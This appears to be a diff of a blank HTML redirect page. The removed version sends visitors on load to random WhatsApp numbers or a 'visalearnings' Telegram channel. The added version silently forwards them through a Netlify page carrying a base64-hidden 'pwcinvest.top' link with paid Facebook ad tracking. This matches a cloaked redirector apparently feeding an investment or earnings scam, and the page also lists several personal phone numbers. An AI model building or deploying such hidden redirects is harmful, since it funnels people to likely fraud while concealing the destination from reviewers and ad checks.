@@ -1,34 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirect</title>
-  <script>
-    function randomRedirect() {
-      const urls = [
-        'https://wa.me/+919559332624',
-        'https://wa.me/+919647867064',
-        'https://wa.me/+918513977895',
-        'https://wa.me/+919330594661',
-        'https://wa.me/+919038377263',
-        'https://wa.me/+916001883061',
-        'https://wa.me/+918918321709',
-        'https://t.me/visalearnings' // Telegram link
-      ];
-      
-      // Get random index
-      const randomIndex = Math.floor(Math.random() * urls.length);
-      
-      // Redirect to the selected URL
-      window.location.href = urls[randomIndex];
-    }
-    
-    // Trigger the redirection on page load
-    window.onload = randomRedirect;
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Redirect</title>
+    <script type="text/javascript">
+        // Redirect immediately when the page loads
+       window.onload = function() {
+           window.location.href = "https://elegant-froyo-05a4b3.netlify.app/redirect.html?data=aHR0cDovL3B3Y2ludmVzdC50b3Avd29yaz91dG1fbWVkaXVtPXBhaWQmdXRtX3NvdXJjZT1mYiZ1dG1faWQ9MTIwMjE3MDY3MDYwODQwNzczJnV0bV9jb250ZW50PTEyMDIxNzA2NzA4ODk5MDc3MyZ1dG1fdGVybT0xMjAyMTcwNjcwODkwMTA3NzMmdXRtX2NhbXBhaWduPTEyMDIxNzA2NzA2MDg0MDc3Mw=="; // Change this to the link you want
+         
+          // window.location.href = "https://t.me/visalearning";
+       
+       };
+
+         
+    </script>
 </head>
 <body>
-<!--   <p>Redirecting you...</p> -->
+    <!-- No content in the body -->
 </body>
 </html>
